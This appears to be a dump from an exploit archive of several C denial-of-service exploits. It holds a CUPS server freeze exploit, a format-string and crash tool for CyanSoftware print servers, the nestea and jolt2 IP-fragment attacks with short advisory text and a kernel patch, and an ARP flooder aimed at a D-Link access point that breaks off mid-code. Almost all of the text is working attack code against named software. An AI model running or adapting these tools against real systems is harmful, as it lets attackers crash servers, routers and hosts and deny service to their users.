    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2006-03-26]
/* dl-cups.c v0.1
 * CUPS server freeze and processor load "fuckup" exploit
 * bug found and exploit coded by tracewar  (darklogic team)
 * for educaional purposes only.
 *****************************************************************
 * greetz goes to:
 * setuid, matan.
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

char EVIL[] = "\x2e\x2e\x5c\x2e\x2e";

void usage(char *argv0) {
	fprintf(stdout, "cups/1.x server freeze and remote cpu usage fuckup\n");
	fprintf(stdout, "exploit coded and bug found by tracewar of darklogic\n\n");
	fprintf(stdout, "usage: %s remote_host remote_port\n", argv0);
	exit(0);
}

int main(int argc, char **argv) {
	char	buffer[50] = "GET /";
	int	sock;
        struct	sockaddr_in	serv_addr;
        struct	hostent	*crap;

	if(argc != 3)
		usage(argv[0]);

	printf("# Making our evil buffer... ");	
	snprintf(&buffer[5], 47, "%s", EVIL);        
	strcat(buffer, "\r\n");
	printf("(done)\n");

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0)
                return printf("# error creating socket.\n");
        crap = gethostbyname(argv[1]);
        if(crap == NULL)
                return printf("# cant resolve the specified hostname: %s\n", argv[1]);
        else
                printf("# connecting to victim... ");

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(atoi(argv[2]));
        bcopy((char *)crap->h_addr, (char *)&serv_addr.sin_addr.s_addr, crap->h_length);

        if (connect(sock, &serv_addr, sizeof(serv_addr)) < 0)
                return printf("(error)\n# check again %s:%d\n", argv[1], atoi(argv[2]));

        printf("(done)\n# sending crafted string... ");
        if( (send(sock, buffer, strlen(buffer), 0)) == -1 )
                return printf("\n# error while sending the crafted string.!\n");
	close(sock);
        return puts("(done)\n# The server should be frozen now with 100\% cpu usage.");

}

// milw0rm.com [2005-09-05]
/*
  by Luigi Auriemma
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        515



int putss(u8 *data, u8 *str);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            attack;
    u16     port    = PORT;
    u8      buff[1024],
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Format string and crash in CyanSoftware print servers "VER"\n"
        "  Opium4 OPI Server <= 4.10.1028\n"
        "  cyanPrintIP Easy OPI <= 4.10.1030\n"
        "  cyanPrintIP Professional <= 4.10.1030\n"
        "  cyanPrintIP Workstation <= 4.10.836\n"
        "  cyanPrintIP Standard <= 4.10.940\n"
        "  cyanPrintIP Basic <= 4.10.1030\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host>\n"
            "\n"
            "Attacks:\n"
            " 1 = format string in ReportSysLogEvent\n"
            " 2 = service crash through \"Send queue state\" commands\n"
            "\n", argv[0]);
        exit(1);
    }

    attack = atoi(argv[1]);

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))
     < 0) std_err();

    p = buff;
    if(attack == 1) {
        printf("- format string in ReportSysLogEvent\n");
        *p++ = 2;
        p += putss(p, "%n%n%n%s%s%s%n%n%n%s\n");

    } else if(attack == 2) {
        printf("- service crash through \"Send queue state\" commands\n");
        *p++ = 3;   // 3 or 4
        p += putss(p, "queue 123 job\n");

    } else {
        printf("\nError: wrong attack number\n");
        exit(1);
    }

    printf("- send malformed data\n");
    send(sd, buff, p - buff, 0);
    if(!timeout(sd, 5)) recv(sd, buff, sizeof(buff), 0);

    printf("- done\n");
    close(sd);
    return(0);
}



int putss(u8 *data, u8 *str) {
    int     len;

    len = strlen(str);
    memcpy(data, str, len);
    return(len);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


source: http://www.securityfocus.com/bid/7219/info

It has been reported that the implementation of the Internet Protocol (IP) in the firmware of the D-Link DI-614+ wireless router is vulnerable to a remotely exploitable denial of service condition. The vulnerability is related to the reassembly of fragmented IP packets and can be triggered by transmission of fragments with malicious size parameters to an affected device. There is existing source code that exploits similar, older vulnerabilities that can be used to successfully exploit this vulnerability. When exploited, the device will reboot instantly. This will result in a denial of service until the device has restarted. 

                    // nestea.c by humble of rhino9 4/16/98
                    // This exploits the "off by one ip header" bug in the linux ip frag code.
                    // Crashes linux 2.0.* and 2.1.* and some windows boxes
                    // this code is a total rip of teardrop - it's messy
                    // hi sygma

                    #include <stdio.h>
                    #include <stdlib.h>
                    #include <unistd.h>
                    #include <string.h>
                    #include <netdb.h>
                    #include <netinet/in.h>
                    #include <netinet/udp.h>
                    #include <arpa/inet.h>
                    #include <sys/types.h>
                    #include <sys/time.h>
                    #include <sys/socket.h>

                    // bsd usage is currently broken because of socket options on the third sendto

                    #ifdef STRANGE_BSD_BYTE_ORDERING_THING
                    /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */
                    #define FIX(n) (n)
                    #else /* OpenBSD 2.1, all Linux */
                    #define FIX(n) htons(n)
                    #endif /* STRANGE_BSD_BYTE_ORDERING_THING */

                    #define IP_MF 0x2000 /* More IP fragment en route */
                    #define IPH 0x14 /* IP header size */
                    #define UDPH 0x8 /* UDP header size */
                    #define MAGIC2 108
                    #define PADDING 256 /* datagram frame padding for first packet */
                    #define COUNT 500 /* we are overwriting a small number of bytes we 
                    shouldnt have access to in the kernel. 
                    to be safe, we should hit them till they die :> */

                    void usage(u_char *);
                    u_long name_resolve(u_char *);
                    u_short in_cksum(u_short *, int);
                    void send_frags(int, u_long, u_long, u_short, u_short);

                    int main(int argc, char **argv)
                    {
                    int one = 1, count = 0, i, rip_sock;
                    u_long src_ip = 0, dst_ip = 0;
                    u_short src_prt = 0, dst_prt = 0;
                    struct in_addr addr;


                    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
                    {
                    perror("raw socket");
                    exit(1);
                    }
                    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))
                    < 0)
                    {
                    perror("IP_HDRINCL");
                    exit(1);
                    }
                    if (argc < 3) usage(argv[0]);
                    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))
                    {
                    fprintf(stderr, "What the hell kind of IP address is that?\n");
                    exit(1);
                    }

                    while ((i = getopt(argc, argv, "s:t:n:")) != EOF)
                    {
                    switch (i)
                    {
                    case 's': /* source port (should be emphemeral) */
                    src_prt = (u_short)atoi(optarg);
                    break;
                    case 't': /* dest port (DNS, anyone?) */
                    dst_prt = (u_short)atoi(optarg);
                    break;
                    case 'n': /* number to send */
                    count = atoi(optarg);
                    break;
                    default :
                    usage(argv[0]);
                    break; /* NOTREACHED */
                    }
                    }
                    srandom((unsigned)(time((time_t)0)));
                    if (!src_prt) src_prt = (random() % 0xffff);
                    if (!dst_prt) dst_prt = (random() % 0xffff);
                    if (!count) count = COUNT;

                    fprintf(stderr, "Nestea by humble\nCode ripped from teardrop by route / daemon9\n");
                    fprintf(stderr, "Death on flaxen wings (yet again):\n");
                    addr.s_addr = src_ip;
                    fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);
                    addr.s_addr = dst_ip;
                    fprintf(stderr, " To: %15s.%5d\n", inet_ntoa(addr), dst_prt);
                    fprintf(stderr, " Amt: %5d\n", count);
                    fprintf(stderr, "[ ");

                    for (i = 0; i < count; i++)
                    {
                    send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
                    fprintf(stderr, "b00m ");
                    usleep(500);
                    }
                    fprintf(stderr, "]\n");
                    return (0);
                    }

                    void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
                    u_short dst_prt)
                    {
                    int i;
                    u_char *packet = NULL, *p_ptr = NULL; /* packet pointers */
                    u_char byte; /* a byte */
                    struct sockaddr_in sin; /* socket protocol structure */

                    sin.sin_family = AF_INET;
                    sin.sin_port = src_prt;
                    sin.sin_addr.s_addr = dst_ip;

                    packet = (u_char *)malloc(IPH + UDPH + PADDING+40);
                    p_ptr = packet;
                    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

                    byte = 0x45; /* IP version and header length */
                    memcpy(p_ptr, &byte, sizeof(u_char));
                    p_ptr += 2; /* IP TOS (skipped) */
                    *((u_short *)p_ptr) = FIX(IPH + UDPH + 10); /* total length */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(242); /* IP id */
                    p_ptr += 2;
                    *((u_short *)p_ptr) |= FIX(IP_MF); /* IP frag flags and offset */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = 0x40; /* IP TTL */
                    byte = IPPROTO_UDP;
                    memcpy(p_ptr + 1, &byte, sizeof(u_char));
                    p_ptr += 4; /* IP checksum filled in by kernel */
                    *((u_long *)p_ptr) = src_ip; /* IP source address */
                    p_ptr += 4;
                    *((u_long *)p_ptr) = dst_ip; /* IP destination address */
                    p_ptr += 4;
                    *((u_short *)p_ptr) = htons(src_prt); /* UDP source port */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(dst_prt); /* UDP destination port */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(8 + 10); /* UDP total length */

                    if (sendto(sock, packet, IPH + UDPH + 10, 0, (struct sockaddr *)&sin,
                    sizeof(struct sockaddr)) == -1)
                    {
                    perror("\nsendto");
                    free(packet);
                    exit(1);
                    }

                    p_ptr = packet;
                    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

                    byte = 0x45; /* IP version and header length */
                    memcpy(p_ptr, &byte, sizeof(u_char));
                    p_ptr += 2; /* IP TOS (skipped) */
                    *((u_short *)p_ptr) = FIX(IPH + UDPH + MAGIC2); /* total length */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(242); /* IP id */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = FIX(6); /* IP frag flags and offset */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = 0x40; /* IP TTL */
                    byte = IPPROTO_UDP;
                    memcpy(p_ptr + 1, &byte, sizeof(u_char));
                    p_ptr += 4; /* IP checksum filled in by kernel */
                    *((u_long *)p_ptr) = src_ip; /* IP source address */
                    p_ptr += 4;
                    *((u_long *)p_ptr) = dst_ip; /* IP destination address */
                    p_ptr += 4;
                    *((u_short *)p_ptr) = htons(src_prt); /* UDP source port */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(dst_prt); /* UDP destination port */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(8 + MAGIC2); /* UDP total length */

                    if (sendto(sock, packet, IPH + UDPH + MAGIC2, 0, (struct sockaddr *)&sin,
                    sizeof(struct sockaddr)) == -1)
                    {
                    perror("\nsendto");
                    free(packet);
                    exit(1);
                    }

                    p_ptr = packet;
                    bzero((u_char *)p_ptr, IPH + UDPH + PADDING+40);
                    byte = 0x4F; /* IP version and header length */
                    memcpy(p_ptr, &byte, sizeof(u_char));
                    p_ptr += 2; /* IP TOS (skipped) */
                    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING+40); /* total length */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(242); /* IP id */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = 0 | FIX(IP_MF); /* IP frag flags and offset */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = 0x40; /* IP TTL */
                    byte = IPPROTO_UDP;
                    memcpy(p_ptr + 1, &byte, sizeof(u_char));
                    p_ptr += 4; /* IP checksum filled in by kernel */
                    *((u_long *)p_ptr) = src_ip; /* IP source address */
                    p_ptr += 4;
                    *((u_long *)p_ptr) = dst_ip; /* IP destination address */
                    p_ptr += 44;
                    *((u_short *)p_ptr) = htons(src_prt); /* UDP source port */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(dst_prt); /* UDP destination port */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(8 + PADDING); /* UDP total length */

                    for(i=0;i<PADDING;i++)
                    {
                    p_ptr[i++]=random()%255;
                    } 

                    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,
                    sizeof(struct sockaddr)) == -1)
                    {
                    perror("\nsendto");
                    free(packet);
                    exit(1);
                    }
                    free(packet);
                    }

                    u_long name_resolve(u_char *host_name)
                    {
                    struct in_addr addr;
                    struct hostent *host_ent;

                    if ((addr.s_addr = inet_addr(host_name)) == -1)
                    {
                    if (!(host_ent = gethostbyname(host_name))) return (0);
                    bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
                    }
                    return (addr.s_addr);
                    }

                    void usage(u_char *name)
                    {
                    fprintf(stderr,
                    "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\n",
                    name);
                    exit(0);
                    }

                    SOLUTION

                    Apply the following patch to icmp_fragment.c in your
                    kernel (fixes for Windows not yet determined).

                    (Patch from Alan Cox)

                    --- ip_fragment.c.old Thu Apr 16 12:25:34 1998
                    +++ ip_fragment.c Thu Apr 16 12:29:02 1998
                    @@ -375,7 +375,7 @@
                    fp = qp->fragments;
                    while(fp != NULL)
                    {
                    - if (fp->len < 0 || count+fp->len > skb->len)
                    + if (fp->len < 0 || fp->offset+qp->ihlen+fp->len >
                    skb->len)
                    {
                    NETDEBUG(printk("Invalid fragment list: Fragment over
                    size.\n"));
                    ip_free(qp);

source: http://www.securityfocus.com/bid/3306/info

The DLink Dl-704 is a DSL/Cable router and switch designed for home network use.

A problem has been discovered in the Dl-704 router. Upon receiving a high amount of fragmented IP packets, the router begins to become resource starved. After receiving these packets for a period greater than two minutes, the router will become unstable, ceasing operation.

This results in a denial of service users on either side of the router. A power cycling is required to resume normal operation. 

/*
 * File:   jolt2.c
 * Author: Phonix <phonix@moocow.org>
 * Date:   23-May-00
 *
 * Description: This is the proof-of-concept code for the
 *              Windows denial-of-serice attack described by
 *              the Razor team (NTBugtraq, 19-May-00)
 *              (MS00-029).  This code causes cpu utilization
 *              to go to 100%.
 *
 * Tested against: Win98; NT4/SP5,6; Win2K
 *
 * Written for: My Linux box.  YMMV.  Deal with it.
 *
 * Thanks: This is standard code.  Ripped from lots of places.
 *         Insert your name here if you think you wrote some of
 *         it.  It's a trivial exploit, so I won't take credit
 *         for anything except putting this file together.
 */

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <getopt.h>

struct _pkt
{
  struct iphdr    ip;
  union {
    struct icmphdr  icmp;
    struct udphdr   udp;
  }  proto;
  char data;
} pkt;

int icmplen  = sizeof(struct icmphdr),
    udplen   = sizeof(struct udphdr),
    iplen    = sizeof(struct iphdr),
    spf_sck;

void usage(char *pname)
{
  fprintf (stderr, "Usage: %s [-s src_addr] [-p port] dest_addr\n",
           pname);
  fprintf (stderr, "Note: UDP used if a port is specified, otherwise ICMP\n");
  exit(0);
}

u_long host_to_ip(char *host_name)
{
  static  u_long ip_bytes;
  struct hostent *res;

  res = gethostbyname(host_name);
  if (res == NULL)
    return (0);
  memcpy(&ip_bytes, res->h_addr, res->h_length);
  return (ip_bytes);
}

void quit(char *reason)
{
  perror(reason);
  close(spf_sck);
  exit(-1);
}

int do_frags (int sck, u_long src_addr, u_long dst_addr, int port)
{
  int     bs, psize;
  unsigned long x;
  struct  sockaddr_in to;

  to.sin_family = AF_INET;
  to.sin_port = 1235;
  to.sin_addr.s_addr = dst_addr;

  if (port)
    psize = iplen + udplen + 1;
  else
    psize = iplen + icmplen + 1;
  memset(&pkt, 0, psize);

  pkt.ip.version = 4;
  pkt.ip.ihl = 5;
  pkt.ip.tot_len = htons(iplen + icmplen) + 40;
  pkt.ip.id = htons(0x455);
  pkt.ip.ttl = 255;
  pkt.ip.protocol = (port ? IPPROTO_UDP : IPPROTO_ICMP);
  pkt.ip.saddr = src_addr;
  pkt.ip.daddr = dst_addr;
  pkt.ip.frag_off = htons (8190);

  if (port)
  {
    pkt.proto.udp.source = htons(port|1235);
    pkt.proto.udp.dest = htons(port);
    pkt.proto.udp.len = htons(9);
    pkt.data = 'a';
  } else {
    pkt.proto.icmp.type = ICMP_ECHO;
    pkt.proto.icmp.code = 0;
    pkt.proto.icmp.checksum = 0;
  }

  while (1) {
    bs = sendto(sck, &pkt, psize, 0, (struct sockaddr *) &to,
              sizeof(struct sockaddr));
  }
  return bs;
}

int main(int argc, char *argv[])
{
  u_long  src_addr, dst_addr;
  int i, bs=1, port=0;
  char hostname[32];

  if (argc < 2)
    usage (argv[0]);

  gethostname (hostname, 32);
  src_addr = host_to_ip(hostname);

  while ((i = getopt (argc, argv, "s:p:h")) != EOF)
  {
    switch (i)
    {
      case 's':
        dst_addr = host_to_ip(optarg);
        if (!dst_addr)
          quit("Bad source address given.");
        break;

      case 'p':
        port = atoi(optarg);
        if ((port <=0) || (port > 65535))
          quit ("Invalid port number given.");
        break;

      case 'h':
      default:
        usage (argv[0]);
    }
  }

  dst_addr = host_to_ip(argv[argc-1]);
  if (!dst_addr)
    quit("Bad destination address given.");

  spf_sck = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (!spf_sck)
    quit("socket()");
  if (setsockopt(spf_sck, IPPROTO_IP, IP_HDRINCL, (char *)&bs,
      sizeof(bs)) < 0)
    quit("IP_HDRINCL");

  do_frags (spf_sck, src_addr, dst_addr, port);
}
/* 

ARP FLOODER v0.1 - poplix@papuasia.org  -  2006-12-04 
designed to crash D-LINK DWL-2000AP+

compile with: gcc arpflood.c -o arpflood


*/



#define _BSD_SOURCE 1
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <fcntl.h>
#include <errno.h>


#include <sys/ioctl.h>
#include <sys/param.h>//param.h defines BSD in bsd systems 
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/sysctl.h>

#include <net/if.h>
#include <net/if_arp.h>
#include <net/route.h>

#ifdef BSD
#include <net/if_dl.h>
 #include <net/bpf.h>
#endif


#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/in_systm.h>
#include <ifaddrs.h>



#ifdef BSD
#include <unistd.h>
#include <net/if_types.h>
#endif


#ifdef __linux__
#include <net/if_arp.h>
#include <linux/if_packet.h>
#endif

#ifndef DLT_EN10MB
#define DLT_EN10MB	1
#endif

#ifndef DLT_LOOP
#define DLT_LOOP	10
#endif

#ifndef DLT_PPP
#define DLT_PPP		9
#endif

#define ETHADDR_SIZE 6
#define ETHHDR_SIZE 14
#define ETHTYPE_IP 0x0800
#define ETHERTYPE_ARP 0x0806





#define SMALLOC(x,y){x=(y*)malloc(sizeof(y));\
						if( x == NULL){printf("malloc out of memory");\
						exit(9);}\
					}



#define CALLOC(x,y,z){ x=(y*)calloc(z,sizeof(y));if(x==NULL){\
	printf("calloc out of memory\n");\
	exit(9);}}

#define SSTRNCPY(dst,src,len){strncpy(dst,src,len-1); dst[len-1]=0;}
#define SSTRNCAT(dst,src,len)strncat(dst,src, len - strlen(dst) - 1);





#define ETHARP_PKT_SIZE 42 // eth + arpfixedsize + addresses size


#define FTYPE_REQ 1
#define FTYPE_REPLY 2




struct intf{
	char name[12];
	u_int index;
	int fd;
	u_int mtu;
	u_int type;
	
	u_int32_t ipaddr;
	u_int32_t netmask;
	
	u_char  l2addr[6];
	u_int	l2addr_size;
	u_int	l2hdr_size;
	
};




struct intf out_intf;




u_int ip_to_int(char *ip, int *err){
  char *inv,*s;
  u_char ret[4];
  int a;
  u_int tmp;
	
	if(ip == NULL || strlen(ip) < 7) return 0;
	s=ip;
	for( a=0; a < 4; a++){
  		tmp=strtoul(s,&inv,10);
  		if( (*inv != '.' && *inv!=0) || tmp < 0 || tmp > 255 ) {
  			if(err != NULL)*err=1;
  			return 0;
  		}
  		ret[a]=tmp;
  		s=++inv;
	}
	
	if(err != NULL)*err=0;
	return *((u_int*)ret);

}


int str_to_macaddr(char *str, u_char *dst){
  char *inv,*s;
  int a;
  u_int tmp;
	
	if(str == NULL || strlen(str) < 11) return 0;
	s=str;
	for( a=0; a < 6; a++){
  		tmp=strtoul(s,&inv,16);
  		if( (*inv != ':' && *inv!=0) || tmp < 0x00 || tmp > 0xff ) 
  			return 0;
  		
  		dst[a]=tmp;
  		s=++inv;
	}
	
	
	return 1;

}



char *int_to_ip(u_int32_t ip){
	u_char *tmp=(u_char *)&ip;
	static char ret[16];
	memset(ret,0,sizeof(ret));
	sprintf(ret,"%u.%u.%u.%u",tmp[0] & 0xff,tmp[1] & 0xff,tmp[2] & 0xff,tmp[3] & 0xff);
	return ret;
	
}


char *macaddr_to_str(u_char *mac){
	static char ret[18];
	memset(ret,0,sizeof(ret));
	sprintf(ret,"%02x:%02x:%02x:%02x:%02x:%02x",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
	return ret;
	
}








int build_ether_hdr(u_char *dst, u_char* src,u_short type,u_char* dstbuff){
  memcpy(dstbuff,dst,ETHADDR_SIZE);
  memcpy(dstbuff+6,src,ETHADDR_SIZE);
  
  *( (u_short*)(dstbuff+12) ) = htons(type);
  
  return 1;
	
}




int build_arp_hdr(u_char *hdst,u_int32_t pdst,u_char* hsrc,u_int32_t psrc,u_short arpop,u_char* dstbuff){
  struct arphdr* hdr= (struct arphdr*)dstbuff;
  u_int off;
  
	hdr->ar_hrd=htons(ARPHRD_ETHER);
  	hdr->ar_pro=htons(ETHTYPE_IP);
  	hdr->ar_hln=ETHADDR_SIZE;
  	hdr->ar_pln=4;
  	hdr->ar_op=htons(arpop);
  	
  	off=8;
  	
  	memcpy(dstbuff + off,hsrc,ETHADDR_SIZE);
	off+=ETHADDR_SIZE;
	
	memcpy(dstbuff + off,(u_char*)&psrc,4);
	off+=4,
	
  	memcpy(dstbuff + off,hdst,ETHADDR_SIZE);
  	off+=ETHADDR_SIZE;
  	
	memcpy(dstbuff + off,(u_char*)&pdst,4);
  	
  	return 1;
}



int arp_request(u_int32_t ripaddr,u_int32_t ipsrc,u_char *macsrc){
  u_char arpbuff[ETHARP_PKT_SIZE]; 

	if(macsrc==NULL)macsrc=out_intf.l2addr;
	if(ipsrc==0)ipsrc=out_intf.ipaddr;
	build_ether_hdr((u_char*)"\xff\xff\xff\xff\xff\xff",macsrc,ETHERTYPE_ARP,arpbuff);
	
	build_arp_hdr((u_char*)"\x0\x0\x0\x0\x0\x0",
					ripaddr,
					macsrc,
					ipsrc,
					ARPOP_REQUEST,
					arpbuff + ETHHDR_SIZE
					);
					
	write_link(&out_intf,arpbuff,sizeof(arpbuff));

	return 1;
}




int arp_reply(u_int32_t ipdst,u_char *dstmac,u_int32_t ipsrc,u_char *srcmac){
   u_char arpbuff[ETHHDR_SIZE + ETHARP_PKT_SIZE];
	
	if(srcmac==NULL)srcmac=out_intf.l2addr;
	
	build_ether_hdr(dstmac, srcmac, ETHERTYPE_ARP, arpbuff);
	build_arp_hdr(dstmac, ipdst, srcmac, ipsrc, ARPOP_REPLY, arpbuff+ETHHDR_SIZE);
	write_link(&out_intf,arpbuff,sizeof(arpbuff));

	return 1;
}




#ifdef BSD

int getifinfo(char *name,struct intf *iface){
   struct ifaddrs *ifap, *ifa;
   int find=0;
	
   int mib[]={CTL_NET,AF_ROUTE,0,AF_LINK,NET_RT_IFLIST,0};
   size_t len;
   u_char *buff, *next, *end;
   struct if_msghdr *ifm;
   struct sockaddr_dl *sdl;


	// get the list 
	if(getifaddrs(&ifap) < 0) return 0;
	
	if(!ifap) return 0; 
	//nota che ogni inf compare due volte in lista, una volta come AF_LINK e una AF_INET
	for(ifa = ifap; ifa; ifa = ifa->ifa_next)
	 if(!strcmp(name,ifa->ifa_name)){
	 	//copy only the first time
	 	if(find==0){
	 		memset(iface->name,0,sizeof(iface->name));
	 		SSTRNCPY(iface->name,name,sizeof(iface->name));
	 	}
	 	find=1;
		if(ifa->ifa_addr->sa_family == AF_LINK){
			iface->mtu=((struct if_data*)ifa->ifa_data)->ifi_mtu;
			
			switch(((struct if_data*)ifa->ifa_data)->ifi_type){
				case IFT_ETHER:
					iface->type=DLT_EN10MB;
					iface->l2hdr_size=ETHHDR_SIZE;
					break;
				case IFT_GIF:
				case IFT_LOOP:
					iface->type=DLT_LOOP;
					iface->l2hdr_size=0;
					break;
				case IFT_PPP:
					iface->type = DLT_PPP;
				default:
					freeifaddrs(ifap);
					return 0;
			}
			
		}
		if(ifa->ifa_addr->sa_family == AF_INET){
			iface->ipaddr  = (u_int32_t) ((struct sockaddr_in*)ifa->ifa_addr)->sin_addr.s_addr;
			iface->netmask = (u_int32_t) ((struct sockaddr_in*)ifa->ifa_netmask)->sin_addr.s_addr;
		}
	  }
		
	freeifaddrs(ifap);
	
	//get hardware address
	if (sysctl(mib, ETHADDR_SIZE, NULL, &len, NULL, 0) == -1){
		printf("getting hardware address\n");
		exit(1);
	}

    CALLOC(buff,u_char,len);
    if (sysctl(mib, ETHADDR_SIZE, buff, &len, NULL, 0) < 0){
        free(buff);
        printf("getting hardware address\n");
        exit(1);
    }
    end = buff + len;

    for (next = buff ; next < end ; next += ifm->ifm_msglen){
        ifm = (struct if_msghdr *)next;
        if (ifm->ifm_type == RTM_IFINFO){
            sdl = (struct sockaddr_dl *)(ifm + 1);
            if (strncmp(&sdl->sdl_data[0], iface->name, sdl->sdl_nlen) == 0){
                memcpy(iface->l2addr,LLADDR(sdl),ETHADDR_SIZE);
                break;
            }
        }
    }
    free(buff);

	iface->index=0; // dont care
	
	return find;
	

 }
 
 
//int wrink(u_int fd,u_char *frame, u_int size){
int write_link(struct intf *iface,u_char *frame, u_int size){
    int c;
	
    if (iface->fd < 0){
    	printf("%s\n","bpf error");
    	exit(2);
    }
    c = write(iface->fd, frame, size);
    
    if (c != size){
    	printf("error writing to bpf,, written:%d bytes\n",c);
    	exit(3);
    }

    return (c);
}


int open_link(char* ifname){
   int i, fd;
   char devname[12];
   struct ifreq ifr;
    
    for (i=0; i<100; i++){
        sprintf(devname, "/dev/bpf%u", i);
        fd = open(devname, O_RDWR);
        if (fd == -1 && errno == EBUSY)
            continue;
        else
        	break;
    }

    if (fd == -1){
        printf("unable to open bpf\n");
        exit(4);
    }

    
	SSTRNCPY(ifr.ifr_name, ifname, sizeof(ifr.ifr_name));
    
    if (ioctl(fd, BIOCSETIF, (caddr_t)&ifr) == -1){
       printf("attaching interface to bpf\n");
       exit(4);
    }
    
    
    return (fd);
}

 
#endif
//end of BSD code



#ifdef __linux__
 //fetifinfo sets:ifname, mtu, link-type,layer4 address,layer4 netmask, 
 
int getifinfo(char *name,struct intf *iface){
   int fd,find=0;
   struct ifconf   ifc;
   struct ifreq    ibuf[16], ifr, *ifrp, *ifend;
   struct sockaddr_in sa;
        
	
	
	
	if ( (fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) return 0;
	
	memset(ibuf, 0, sizeof(struct ifreq)*16);
	ifc.ifc_len = sizeof(ibuf);
	ifc.ifc_buf = (caddr_t) ibuf;
	
	/* gets interfaces list */
	if ( ioctl(fd, SIOCGIFCONF, (char*)&ifc) == -1 ||
		 ifc.ifc_len < sizeof(struct ifreq)         ) 
		 	goto bad;
	
	/* ifrp points to buffer and ifend points to buffer's end */
	ifrp = ibuf;
	ifend = (struct ifreq*) ((char*)ibuf + ifc.ifc_len);
	
	for (; ifrp < ifend; ifrp++) {
		if(strcmp(ifrp->ifr_name,name))continue;
		find=1;
		SSTRNCPY(ifr.ifr_name, ifrp->ifr_name, sizeof(ifr.ifr_name));
		
		//get if flags
		if(ioctl(fd, SIOCGIFFLAGS, (char*)&ifr) == -1)
			goto bad;
			
		//if is down
		if ( !(ifr.ifr_flags & IFF_UP) )goto bad;
	
